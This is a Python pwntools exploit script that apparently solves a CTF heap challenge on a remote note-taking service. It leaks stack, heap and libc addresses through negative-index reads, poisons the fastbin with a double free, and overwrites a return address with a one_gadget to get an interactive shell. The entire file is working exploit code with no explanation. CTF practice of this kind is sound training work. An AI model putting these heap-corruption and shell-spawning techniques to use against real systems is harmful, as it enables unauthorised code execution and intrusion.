from pwn import *

r = remote('csie.ctf.tw', 10135)

def newnote(size, data, is_str=False, last=False):
    r.sendlineafter('choice> ', '1')
    if is_str == True:
        r.sendlineafter('size: ', size)
    else:
        r.sendlineafter('size: ', str(size))
    if size == 0 or size == 1:
        return
    if last == True:
        r.sendafter('content: ', data)
        sleep(0.2)
    else:
        r.sendlineafter('content: ', data)
    
def printnote(idx, is_str=False):
    r.sendlineafter('choice> ', '2')
    if is_str == True:
        r.sendlineafter('index: ', idx)
    else:
        r.sendlineafter('index: ', str(idx))

def delnote(idx, is_str=False):
    r.sendlineafter('choice> ', '3')
    if is_str == True:
        r.sendlineafter('index: ', idx)
    else:
        r.sendlineafter('index: ', str(idx))

printnote(-6)
stack = u64(r.recvline().strip().ljust(8, '\x00')) - 0xb0

newnote(0x48, 'A'*0x30) 
newnote(0x10, 'B'*8)    
newnote(0x10, 'C'*8)
newnote(0x10, 'D'*8)
delnote(1)
delnote(2)
newnote(1, 'A')
printnote(1)
heap = u64(r.recvline().strip().ljust(8, '\x00')) - 0x50

printnote('-25' + '\x00'*5 + p64(stack-0x170), is_str=True)
libc = u64(r.recv(6).ljust(8, '\x00')) - 0x3c3b20

newnote(0x50, 'A'*8)
newnote(0x50, 'B'*8)
delnote(2)
delnote(4)
delnote('-25' + '\x00'*5 + p64(heap+0xc0), is_str=True)

newnote(0x50, p64(stack-0xa8) + p64(0)) 
newnote(0x50, 'C'*8)                    
newnote(0x50, 'D'*8)                    

one_gadget = libc + 0xf0567
newnote(str(0x58) + '\x00'*6 + p64(0x61)*14, 'A'*0x50 + p64(one_gadget), is_str=True, last=True)
r.interactive()
